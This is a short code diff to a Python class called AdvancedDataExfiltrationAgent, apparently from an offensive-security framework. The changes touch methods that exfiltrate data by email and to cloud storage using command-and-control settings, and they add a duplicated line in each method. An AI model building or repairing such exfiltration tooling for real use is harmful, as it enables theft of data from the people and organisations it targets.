@@ -575,6 +575,8 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
         try:
             log.info(f"[{self.name}] Exfiltrating via email")
             
+            c2_info = self.context.get("c2_info", {})
+            c2_info = self.context.get("c2_info", {})
             email_server = c2_info.get("email_server") if c2_info else None
             
             if not email_server:
@@ -607,6 +609,8 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
     async def _exfil_cloud_storage(self, prepared_data: Dict) -> Dict:
         """Exfiltrate to cloud storage"""
         try:
+            c2_info = self.context.get("c2_info", {})
+            c2_info = self.context.get("c2_info", {})
             log.info(f"[{self.name}] Exfiltrating to cloud storage")
             
             cloud_config = c2_info.get("cloud") if c2_info else None
